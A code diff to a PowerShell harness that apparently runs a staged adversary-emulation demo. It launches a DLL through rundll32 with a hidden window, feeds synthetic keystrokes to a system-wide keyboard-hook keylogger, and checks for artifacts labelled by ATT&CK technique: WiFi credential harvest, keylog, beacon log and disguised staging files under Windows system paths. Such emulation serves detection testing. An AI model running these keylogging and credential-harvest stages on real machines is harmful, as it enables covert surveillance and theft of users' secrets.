@@ -488,6 +488,21 @@ if (-not $WhatIf -and (Test-Path $msimtfPath)) {
     try {
         $stage5Proc = Start-Process -FilePath "rundll32.exe" -ArgumentList "$msimtfPath,DllRegisterServer" -WindowStyle Hidden -PassThru -ErrorAction Stop
         Write-Log "[*] Stage 5: rundll32 PID=$($stage5Proc.Id) — waiting for WorkerThread (up to 180s)"
+
+        # ponytail: seed synthetic keystrokes 3s into the keylogger window so
+        # Telemetry.bin is non-empty on every run. The WorkerThread spawns the
+        # keylogger thread immediately (payload.c:1474) which holds a
+        # WH_KEYBOARD_LL hook for 120s. SendKeys fires into whatever window
+        # has focus — for an unattended demo, that's the desktop, and the
+        # hook captures it either way (LL hook sees input system-wide).
+        Start-Sleep -Seconds 3
+        $wshell = New-Object -ComObject WScript.Shell
+        for ($i = 0; $i -lt 5; $i++) {
+            Start-Sleep -Seconds 1
+            $wshell.SendKeys('scenario2[ENTER]')
+        }
+        Write-Log "[*] Stage 5: sent 5 synthetic keystrokes to seed keylog buffer"
+
         $stage5Proc.WaitForExit(180000) | Out-Null
         if ($stage5Proc.HasExited) {
             Write-Log "[+] Stage 5: DllRegisterServer completed (exit code $($stage5Proc.ExitCode))"
@@ -526,7 +541,7 @@ $artifacts = @{
     "T1552.004 WiFi harvest"             = "C:\ProgramData\USOShared\Logs\Wifi.bin"
     "T1003.001 WDigest log (keylog)"     = "C:\ProgramData\USOShared\Logs\Telemetry.bin"
     "T1041 HTTP beacon log"              = "C:\ProgramData\USOShared\Logs\cache.dat"
-    "T1074.001 staging scatter"          = "C:\ProgramData\Microsoft\Search\Data\EDS\spcache.bin"
+    "T1074.001 staging scatter"          = "C:\ProgramData\Microsoft\Windows\WER\ReportArchive\state.tmp"
 }
 
 function Test-Artifact {
